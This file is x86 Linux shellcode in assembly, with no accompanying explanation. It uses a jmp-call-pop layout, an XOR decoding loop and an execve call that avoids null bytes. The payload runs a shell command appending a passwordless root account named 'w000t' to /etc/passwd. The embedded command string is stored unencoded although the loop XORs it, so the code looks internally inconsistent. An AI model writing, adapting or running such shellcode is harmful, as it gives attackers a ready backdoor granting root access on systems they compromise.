global _start

section .text
_start:

	jmp short call_shellcode

shellcode:
	pop esi


	; xor decode
	; xor eax,eax
	mov al,0x90
	; mov ecx,88		; length of string
	xor ecx,ecx
	mov cl,72
	mov ebx,esi
dec:
	xor [ebx],al
	inc ebx
	loop dec


	xor eax,eax
	; mov [esi+0x7],al
	; mov [esi+0xa],al
	; mov [esi+0x47],al

	mov [esi+0x49],esi

	lea ebx,[esi+0x8]
	mov [esi+0x4d],ebx

	lea ebx,[esi+0xb]
	mov [esi+0x51],ebx
	mov [esi+0x55],eax


	; mov al,0xb
	mov al,5
	add al,6

	mov ebx,esi
	lea ecx,[esi+0x49]
	lea edx,[esi+0x55]
	int 0x80


call_shellcode:
	call shellcode
	exec db "/bin/sh",0x00,"-c",0x00,"/bin/echo w000t::0:0:s4fem0de:/root:/bin/bash >> /etc/passwd",0x00,"AAAABBBBCCCCDDDD"
